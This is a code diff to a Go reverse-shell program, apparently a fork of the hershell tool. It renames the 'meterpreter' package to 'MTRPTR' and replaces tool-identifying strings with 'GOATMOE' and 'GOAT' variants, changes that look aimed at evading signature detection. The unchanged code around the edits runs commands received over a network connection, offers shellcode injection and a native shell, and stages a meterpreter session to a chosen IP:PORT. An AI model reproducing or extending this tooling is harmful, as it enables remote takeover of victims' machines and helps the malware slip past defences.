@@ -10,8 +10,8 @@ import (
 	"os"
 	"strings"
 
-	"github.com/lesnuages/hershell/meterpreter"
-	"github.com/lesnuages/hershell/shell"
+	"github.com/0xc0ffeee/HRSHL/MTRPTR"
+	"github.com/0xc0ffeee/HRSHL/shell"
 )
 
 const (
@@ -28,7 +28,7 @@ var (
 func interactiveShell(conn net.Conn) {
 	var (
 		exit    = false
-		prompt  = "[hershell]> "
+		prompt  = "[GOATMOE]> "
 		scanner = bufio.NewScanner(conn)
 	)
 
@@ -43,12 +43,12 @@ func interactiveShell(conn net.Conn) {
 				if len(argv) > 2 {
 					transport := argv[1]
 					address := argv[2]
-					ok, err := meterpreter.Meterpreter(transport, address)
+					ok, err := mtrptr.MTRPTR(transport, address)
 					if !ok {
 						conn.Write([]byte(err.Error() + "\n"))
 					}
 				} else {
-					conn.Write([]byte("Usage: meterpreter [tcp|http|https] IP:PORT\n"))
+					conn.Write([]byte("Usage: MTRPTR [tcp|http|https] IP:PORT\n"))
 				}
 			case "inject":
 				if len(argv) > 1 {
@@ -57,7 +57,7 @@ func interactiveShell(conn net.Conn) {
 			case "exit":
 				exit = true
 			case "run_shell":
-				conn.Write([]byte("Enjoy your native shell\n"))
+				conn.Write([]byte("Enjoy your native GOAT\n"))
 				runShell(conn)
 			default:
 				shell.ExecuteCmd(command, conn)
